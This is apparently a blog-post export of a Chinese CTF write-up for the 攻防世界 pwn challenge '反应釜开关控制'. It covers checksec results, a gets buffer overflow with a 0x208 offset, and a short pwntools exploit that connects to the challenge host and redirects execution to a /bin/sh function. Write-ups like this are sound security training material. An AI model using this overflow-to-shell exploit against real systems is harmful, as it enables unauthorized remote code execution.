{"title":"攻防世界 -pwn- 反应釜开关控制","slug":"攻防世界-pwn-反应釜开关控制","date":"2020-07-15","updated":"2020-07-15","comments":true,"path":"api/posts/55706.json","excerpt":null,"cover":"https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png","covers":["https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png","https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png","https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png"],"content":"<h2 id=\"checksec\"><a href=\"#checksec\" class=\"headerlink\" title=\"checksec:\"></a>checksec:</h2><p><img src=\"https://i.loli.net/2020/07/15/3D5qjSLvGN2CJzT.png\" alt=\"checksec.PNG\"></p>\n<ul>\n<li>可以修改 GOT 表</li>\n<li>可以通过一处的方式来更改程序运行流</li>\n<li>堆栈不可执行</li>\n<li>地址随机化未开启</li>\n</ul>\n<h2 id=\"分析\"><a href=\"# 分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>IDA 查看，发现有 /bin/sh。</p>\n<p><img src=\"https://i.loli.net/2020/07/15/wLf32ASzvt5brWm.png\" alt=\"shell.PNG\"></p>\n<p>get 函数可溢出，偏移由 v5 得 0x200h+0x8h(偏移对齐)=0x208h</p>\n<p><img src=\"https://i.loli.net/2020/07/15/9mZH7GCz2u8LJq5.png\" alt=\"v5.PNG\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>exp:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">r &#x3D; remote(&#39;220.249.52.133&#39;,39331)</span><br><span class=\"line\">elf &#x3D; ELF(&#39;.&#x2F;control&#39;)</span><br><span class=\"line\">shell_addr &#x3D; 0x04005F6</span><br><span class=\"line\">payload &#x3D; &#39;A&#39;*0x208 + p64(shell_addr)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"后记\"><a href=\"# 后记\" class=\"headerlink\" title=\"后记\"></a>后记 </h2><p> 看了一下大佬的 wp，结果原来是盲打题……</p>\n","url":"/posts/55706/","min2read":"1","word4post":120,"prev_post":{"title":"CVE-2020-6418","url":"/posts/4681/"},"next_post":{"title":"Chrome 调试篇 1 CVE-2019-5768","url":"/posts/7456/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"checksec\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">checksec:</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"分析\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"exp\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">exp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"后记\" href = \"#\"><span class=\"toc-number\">4.</span> <span class=\"toc-text\">后记 </span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}